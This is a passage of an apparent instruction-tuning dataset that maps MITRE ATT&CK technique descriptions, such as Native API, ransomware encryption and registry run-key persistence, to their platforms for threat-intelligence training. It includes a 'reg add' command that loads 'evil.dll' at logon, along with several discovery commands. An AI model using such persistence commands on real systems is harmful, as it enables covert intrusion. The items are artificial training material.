    "instruction": "What are the platforms that are related to the following technique description: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.",
    "context": "",
    "output": "The provided description is related to MITRE technique Native API (T1106);\nTechnique Native API (T1106) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.",
      "answer": "The provided description is related to MITRE technique Native API (T1106);\nTechnique Native API (T1106) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments. With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).\n \n\nThis account modification may immediately follow Create Account or other malicious account activity. Adversaries may also modify existing Valid Accounts that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to Create Account or modify a victim-owned account.",
    "context": "",
    "output": "The provided description is related to MITRE technique Account Manipulation: Additional Cloud Roles (T1098.003);\nTechnique Account Manipulation: Additional Cloud Roles (T1098.003) is applicable to platforms: Google Workspace,  IaaS,  Office 365,  SaaS, Azure AD;\nTherefore, the given procedure description is related to platforms: Google Workspace,  IaaS,  Office 365,  SaaS, Azure AD.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments. With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).\n \n\nThis account modification may immediately follow Create Account or other malicious account activity. Adversaries may also modify existing Valid Accounts that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to Create Account or modify a victim-owned account.",
      "answer": "The provided description is related to MITRE technique Account Manipulation: Additional Cloud Roles (T1098.003);\nTechnique Account Manipulation: Additional Cloud Roles (T1098.003) is applicable to platforms: Google Workspace,  IaaS,  Office 365,  SaaS, Azure AD;\nTherefore, the given procedure description is related to platforms: Google Workspace,  IaaS,  Office 365,  SaaS, Azure AD.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.",
    "context": "",
    "output": "The provided description is related to MITRE technique Screen Capture (T1113);\nTechnique Screen Capture (T1113) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.",
      "answer": "The provided description is related to MITRE technique Screen Capture (T1113);\nTechnique Screen Capture (T1113) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\n\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Archive Collected Data (T1560);\nTechnique Archive Collected Data (T1560) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\n\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",
      "answer": "The provided description is related to MITRE technique Archive Collected Data (T1560);\nTechnique Archive Collected Data (T1560) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Process Discovery (T1057);\nTechnique Process Discovery (T1057) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.",
      "answer": "The provided description is related to MITRE technique Process Discovery (T1057);\nTechnique Process Discovery (T1057) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
    "context": "",
    "output": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
      "answer": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.?",
    "context": "",
    "output": "The provided description is related to MITRE technique User Execution: Malicious File (T1204.002);\nTechnique User Execution: Malicious File (T1204.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",
      "answer": "The provided description is related to MITRE technique User Execution: Malicious File (T1204.002);\nTechnique User Execution: Malicious File (T1204.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
    "context": "",
    "output": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "answer": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.",
    "context": "",
    "output": "The provided description is related to MITRE technique Data Encrypted for Impact (T1486);\nTechnique Data Encrypted for Impact (T1486) is applicable to platforms: Linux,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.",
      "answer": "The provided description is related to MITRE technique Data Encrypted for Impact (T1486);\nTechnique Data Encrypted for Impact (T1486) is applicable to platforms: Linux,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel or Exfiltration Over Alternative Protocol.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Scheduled Transfer (T1029);\nTechnique Scheduled Transfer (T1029) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel or Exfiltration Over Alternative Protocol.",
      "answer": "The provided description is related to MITRE technique Scheduled Transfer (T1029);\nTechnique Scheduled Transfer (T1029) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name Masquerading to hide malware and tools.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Indicator Removal: Timestomp (T1070.006);\nTechnique Indicator Removal: Timestomp (T1070.006) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name Masquerading to hide malware and tools.",
      "answer": "The provided description is related to MITRE technique Indicator Removal: Timestomp (T1070.006);\nTechnique Indicator Removal: Timestomp (T1070.006) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
    "context": "",
    "output": "The provided description is related to MITRE technique Deobfuscate/Decode Files or Information (T1140);\nTechnique Deobfuscate/Decode Files or Information (T1140) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
      "answer": "The provided description is related to MITRE technique Deobfuscate/Decode Files or Information (T1140);\nTechnique Deobfuscate/Decode Files or Information (T1140) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
    "context": "",
    "output": "The provided description is related to MITRE technique Web Service: Dead Drop Resolver (T1102.001);\nTechnique Web Service: Dead Drop Resolver (T1102.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
      "answer": "The provided description is related to MITRE technique Web Service: Dead Drop Resolver (T1102.001);\nTechnique Web Service: Dead Drop Resolver (T1102.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration 